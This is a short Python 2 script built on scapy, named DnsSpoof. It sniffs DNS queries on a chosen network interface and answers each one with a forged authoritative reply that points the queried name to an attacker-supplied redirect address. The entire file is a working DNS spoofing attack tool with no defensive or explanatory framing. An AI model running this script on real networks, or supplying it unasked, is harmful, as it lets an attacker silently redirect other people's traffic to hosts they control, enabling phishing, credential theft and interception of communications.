#!/usr/bin/env python


try:
        import argparse
        import sys
        import signal
        from time import sleep
        import logging
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        from scapy.all import *
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)



class DnsSpoof:

        def __init__(self):

                description = "Description ..."
                usage = "Usage: use --help for futher information"
                parser = argparse.ArgumentParser(description = description, usage = usage)
                parser.add_argument('-i','--interface', dest = 'interface', help = 'Specify the interface', required = True)
                parser.add_argument('-r', '--redirect', dest = 'redirect',  help = 'Redirect host ', required = True)
                self.args = parser.parse_args()

                self.dns_filter = "udp port 53"



        def dns_spoof(self, pkt):

                if pkt.haslayer(DNSQR):
                        spoofed_pkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)/UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport)/DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa = 1, qr = 1, an = DNSRR(rrname = pkt[DNS].qd.qname,  ttl = 10, rdata = self.args.redirect))
                        send(spoofed_pkt, verbose=False)


        def exit_spoof(self, signal, frame):
                sleep(1)
                print "Exiting ..."
                sys.exit(1)


        def main(self):
                """
                        Main code ...
                """
                signal.signal(signal.SIGINT, self.exit_spoof)
                while True:
                        sniff(filter = self.dns_filter, iface = self.args.interface, store = 0, prn = self.dns_spoof)




if __name__ == "__main__":
        dnsspoof = DnsSpoof()
        dnsspoof.main()
